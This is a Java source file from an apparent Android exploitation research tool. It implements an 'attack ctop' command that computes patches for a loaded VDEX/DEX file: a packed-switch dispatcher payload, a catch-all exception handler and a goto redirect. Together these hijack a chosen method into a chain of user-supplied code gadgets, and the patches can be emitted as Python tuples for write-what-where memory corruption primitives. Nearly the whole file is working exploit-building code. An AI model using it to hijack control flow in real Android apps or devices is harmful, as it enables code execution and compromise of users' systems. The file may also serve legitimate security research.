package com.topper.commands.attack;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.LinkedList;
import java.util.List;

import org.eclipse.jdt.annotation.NonNull;
import org.jf.dexlib2.dexbacked.raw.CodeItem;

import com.topper.commands.PicoCommand;
import com.topper.commands.TopLevelCommand;
import com.topper.dex.decompiler.DecompilationResult;
import com.topper.dex.decompiler.Decompiler;
import com.topper.dex.decompiler.SmaliDecompiler;
import com.topper.dex.ehandling.MethodCodeItem;
import com.topper.exceptions.commands.CommandException;
import com.topper.exceptions.commands.IllegalCommandException;
import com.topper.exceptions.commands.IllegalSessionState;
import com.topper.exceptions.commands.InternalExecutionException;
import com.topper.file.ComposedFile;
import com.topper.helpers.BufferHelper;
import com.topper.sstate.CommandContext;
import com.topper.sstate.CommandLink;
import com.topper.sstate.CommandState;
import com.topper.sstate.ExecutionState;
import com.topper.sstate.Session;

import picocli.CommandLine.Command;
import picocli.CommandLine.Option;
import picocli.CommandLine.ParentCommand;

/**
 * For testing: 
 * > file -t VDEX -f ./src/test/java/resources/base.vdex
 * > attack ctop -m 0x580268 -t 0x29 -g 0x594094, 0x5941b4, 0x594390, 0x5945b4 -v -x 0x100
 * 
 * */
@Command(name = "ctop", mixinStandardHelpOptions = true, version = "1.0", description = "Computes a list of patches to apply to the loaded file to achieve gadget chain execution.")
@CommandLink(states = { ExecutionState.class })
public final class TOPExceptionHandlerAttackCommand extends PicoCommand {

	@Option(names = { "-g",
			"--gadgets" }, paramLabel = "GADGETS", required = true, arity = "1..*", split = ",", description = "Ordered list of gadget offsets relative to the loaded file's base (often base.vdex).")
	private List<@NonNull Integer> gadgets;

	@Option(names = { "-m",
			"--method-offset" }, paramLabel = "METHOD_OFFSET", required = true, description = "Offset of the method to patch relative to the loaded file's base (often base.vdex).")
	private int methodOffset;

	@Option(names = { "-t",
			"--exception-type-index" }, paramLabel = "EXCEPTION_TYPE_INDEX", required = true, description = "Type index of the exception type to instantiate and use for throwing. The type is relative to the .dex file used to execute the hijacked method.")
	private int exceptionTypeIndex;

	@Option(names = { "-e",
			"--exception-vreg-index" }, paramLabel = "EXCEPTION_VREG_INDEX", defaultValue = "0", description = "Virtual register used for storing the exception object. E.g. \"v0\" needs \"-v 0\" etc. This dictates what gadgets are eligible for manipulating the control flow.")
	private int exceptionVregIndex;

	@Option(names = { "-p",
			"--pc-vreg-index" }, paramLabel = "PC_VREG_INDEX", defaultValue = "1", description = "Virtual register used for storing the virtual program counter. It dictates what gadget is executed next using a dispatcher.")
	private int pcVregIndex;

	@Option(names = { "-x",
			"--method-handler-padding" }, paramLabel = "METHOD_HANDLER_PADDING", defaultValue = "0", description = "Padding bytes to introduce between the end of the target method and the encoded exception handler (4-byte aligned).")
	private int methodHandlerPadding;

	@Option(names = { "-y",
			"--handler-dispatcher-padding" }, paramLabel = "HANDLE_DISPATCHER_PADDING", defaultValue = "0", description = "Padding bytes to introduce between the encoded exception handler and the actual dispatcher code (4-byte aligned).")
	private int handlerDispatcherPadding;

	@Option(names = { "-a",
			"--alignment" }, paramLabel = "ALIGNMENT", defaultValue = "8", description = "Determines the alignment to use for describing the patches. Patch data is always divisible by alignment and refers to an aligned offset. Useful for Write - What - Where conditions with fixed - sized writes (qword,...).")
	private int alignment;

	@Option(names = { "-v",
			"--verbose" }, defaultValue = "false", description = "Enables verbosity mode that shows details on current execution state of this command.")
	private boolean verbose;

	@Option(names = { "-u", "--tuple" }, defaultValue = "false", description = "Determines whether to write the patches in form of an offset-bytes tuple list usable in python.")
	private boolean tuple;
	
	@ParentCommand
	private AttackCommand parent;

	@Override
	public final void execute(@NonNull final CommandContext context) throws CommandException {

		// Goal: Compute list of patches to apply in current dex context.
		this.checkArgs();

		@NonNull
		final List<@NonNull Patch> patches = this.computePatches();

		printvln("==============================================");
		this.getTopLevel().out().println("Computed Patches:");
		if (this.tuple) {
			this.getTopLevel().out().println("patches = [");
		}
		
		for (@NonNull
		final Patch patch : patches) {
			if (!tuple) {
				this.getTopLevel().out().println(patch);
			} else {
				this.getTopLevel().out().println(String.format("    (%#x, b'", patch.getOffset()) + BufferHelper.bytesToPythonString(patch.getData()) + "'),");
			}
		}
		
		if (this.tuple) {
			this.getTopLevel().out().println("]");
		}
	}

	@Override
	@NonNull
	public final CommandState next() {
		return new ExecutionState(this.getContext());
	}

	@Override
	@NonNull
	public final TopLevelCommand getTopLevel() {
		if (this.parent == null) {
			throw new UnsupportedOperationException("Cannot access parent before its initialized.");
		}
		return this.parent.getTopLevel();
	}

	private final void checkArgs() throws IllegalCommandException, IllegalSessionState {

		@NonNull final Session session = this.getContext().getSession();
		@NonNull final ComposedFile loaded = session.getLoadedFile();

		// Check gadgets exist and point into the loaded file.
		if (this.gadgets == null) {
			throw new IllegalCommandException("List of gadgets does not exist.");
		}
		if (this.gadgets.isEmpty()) {
			throw new IllegalCommandException("At least one gadget must be provided.");
		}

		for (@NonNull
		final Integer offset : this.gadgets) {
			if (offset < loaded.getOffset()) {
				throw new IllegalCommandException("Gadget offset must not point below loaded file.");
			} else if (offset >= loaded.getOffset() + loaded.getBuffer().length) {
				throw new IllegalCommandException("Gadget offset must not point above loaded file.");
			}
		}

		// Check method offset.
		if (this.methodOffset < 0) {
			throw new IllegalCommandException("Method offset must be non - negative.");
		}
		if (this.methodOffset >= loaded.getBuffer().length) {
			throw new IllegalCommandException("Method offset exceeds currently loaded file size "
					+ Integer.toHexString(loaded.getBuffer().length) + ".");
		}
		
		// Check type index
		if (this.exceptionTypeIndex < 0) {
			throw new IllegalCommandException("Exception type index must be non - negative.");
		}

		// Check exception vreg index
		if (this.exceptionVregIndex < 0) {
			throw new IllegalCommandException("Exception vreg index must be non - negative.");
		}

		// Check program counter vreg index
		if (this.pcVregIndex < 0) {
			throw new IllegalCommandException("Virtual program counter vreg index must be non - negative.");
		}

		// Check paddings
		if (this.methodHandlerPadding < 0) {
			throw new IllegalCommandException(
					"Padding between method end and encoded exception handler must be non - negative.");
		}
		if (this.methodHandlerPadding % 4 != 0) {
			throw new IllegalCommandException(
					"Padding between method end and encoded exception handler must be 4-byte aligned.");
		}

		if (this.handlerDispatcherPadding < 0) {
			throw new IllegalCommandException(
					"Padding between encoded exception handler and dispatcher must be non - negative.");
		}
		if (this.handlerDispatcherPadding % 4 != 0) {
			throw new IllegalCommandException(
					"Padding between encoded exception handler and dispatcher must be 4-byte aligned.");
		}

		// Check alignment
		if (this.alignment < 1) {
			throw new IllegalCommandException("Alignment must be positive.");
		}
	}

	@NonNull
	private final List<@NonNull Patch> computePatches() throws IllegalCommandException, IllegalSessionState, InternalExecutionException {

		@NonNull final Session session = this.getContext().getSession();
		@NonNull final ComposedFile loaded = session.getLoadedFile();
		
		@NonNull final List<@NonNull Patch> patches = new LinkedList<>();

		// Grab method header.
		@NonNull final CommandContext context = this.getContext();
		final byte @NonNull [] buffer = loaded.getBuffer();
		@NonNull final MethodCodeItem header = new MethodCodeItem(
				BufferHelper.copyBuffer(buffer, this.methodOffset, this.methodOffset + MethodCodeItem.CODE_ITEM_SIZE));
		printvln("==============================================");
		this.printv(String.format("Method Offset: %#x, ", this.methodOffset) + header.toString());

		// Compute offset of first handler. Handler starts at first 4-byte aligned
		// address after the method.
		int firstHandlerOffset = this.methodOffset + MethodCodeItem.CODE_ITEM_SIZE;
		firstHandlerOffset += header.getInsnsSize() * 2; // end of method
		firstHandlerOffset = (int) ((firstHandlerOffset + 3) & 0xfffffffffffffffcL); // 4-byte alignment
		firstHandlerOffset += this.methodHandlerPadding;

		// Compute dispatcher offset.
		int dispatcherOffset = firstHandlerOffset + CatchAllHandler.getByteSizeBound();
		dispatcherOffset += this.handlerDispatcherPadding;

		// Create dispatcher
		@NonNull final Dispatcher dispatcher = new PackedSwitchDispatcher(dispatcherOffset, this.exceptionVregIndex,
				this.exceptionTypeIndex, this.pcVregIndex, this.getGadgets());
		final byte @NonNull [] payload = dispatcher.payload();
		
		// Check dispatcher code with decompiler
		@NonNull final Decompiler decompiler = new SmaliDecompiler();
		try {
			final DecompilationResult result = decompiler.decompile(payload, null, context.getConfig());
			printvln("==============================================");
			printvln("" + String.format("Payload Offset: %#x", dispatcherOffset));
			printvln("Payload: " + BufferHelper.bytesToString(payload));
			printv(result.getPrettyInstructions());
		} catch (final Exception ignored) {
			throw new InternalExecutionException("Generated payload does not consist of valid instructions (decompilation failed).");
		}

		// Patch in dispatcher payload
		patches.add(this.alignedPatch(loaded, dispatcherOffset, payload));

		// Create exception handler
		@NonNull final CatchAllHandler handler = new CatchAllHandler(this.methodOffset,
				dispatcherOffset + dispatcher.dispatcherOffset());
		printvln("==============================================");
		printvln("" + String.format("Handler offset: %#x", firstHandlerOffset));
		printv(handler.toString());

		// Patch in exception handler payload
		patches.add(this.alignedPatch(loaded, firstHandlerOffset, handler.getBytes()));

		// Account for padding between method and handler by increasing method size
		if (this.methodHandlerPadding > 0) {
			patches.add(this.alignedPatch(loaded, this.methodOffset + CodeItem.INSTRUCTION_COUNT_OFFSET,
					BufferHelper.intToByteArray((int) (header.getInsnsSize() + this.methodHandlerPadding / 2))));
		}
		
		// Ensure there is only a single handler: the catch all
		patches.add(this.alignedPatch(loaded, this.methodOffset + 0x6, BufferHelper.shortToByteArray((short) 1)));
		
		// Perform method redirection into dispatcher using goto
		int gotoOffset = dispatcherOffset - (this.methodOffset + MethodCodeItem.CODE_ITEM_SIZE);
		if (gotoOffset % 2 != 0) {
			throw new InternalExecutionException("Goto offset cannot be expressed in terms of code units.");
		}
		gotoOffset >>= 1;
		
		final ByteBuffer gotoInsn = ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN)
				.put((byte)0x29).put((byte)0x0).putShort((short)gotoOffset);
		final byte[] gotoBuf = gotoInsn.array();
		if (gotoBuf == null) {
			throw new InternalExecutionException("Goto instruction buffer does not exist.");
		}
		patches.add(this.alignedPatch(loaded, this.methodOffset + MethodCodeItem.CODE_ITEM_SIZE, gotoBuf));

		return patches;
	}

	@NonNull
	private final Patch alignedPatch(@NonNull final ComposedFile loaded, final int offset, final byte @NonNull [] data) throws InternalExecutionException {

		final byte @NonNull [] buffer = loaded.getBuffer();
		final int mask = ~(this.alignment - 1);

		final int start = offset;
		final int lower = start & mask;
		final int end = start + data.length;
		final int upper = (end % this.alignment != 0) ? (end & mask) + this.alignment : end;

		if (upper < 0) {
			throw new InternalExecutionException("Aligning data to write triggered integer overflow.");
		}
		if (upper > buffer.length) {
			throw new InternalExecutionException("Aligned upper bound for patch exceeds buffer.");
		}
		
		final byte @NonNull [] total = new byte[upper - lower];
		System.arraycopy(buffer, lower, total, 0, start - lower);
		System.arraycopy(data, 0, total, start - lower, data.length);
		System.arraycopy(buffer, end, total, start - lower + data.length, upper - end);
		
		return new Patch(lower, total);
	}

	private final void printvln(@NonNull final String message) {
		if (!this.verbose) {
			return;
		}
		this.getTopLevel().out().println(message);
	}
	
	private final void printv(@NonNull final String message) {
		if (!this.verbose) {
			return;
		}
		this.getTopLevel().out().print(message);
	}
	
	@NonNull
	private final List<@NonNull Integer> getGadgets() throws IllegalCommandException {
		if (this.gadgets != null) {
			return this.gadgets;
		}
		throw new IllegalCommandException("List of gadgets does not exist.");
	}
}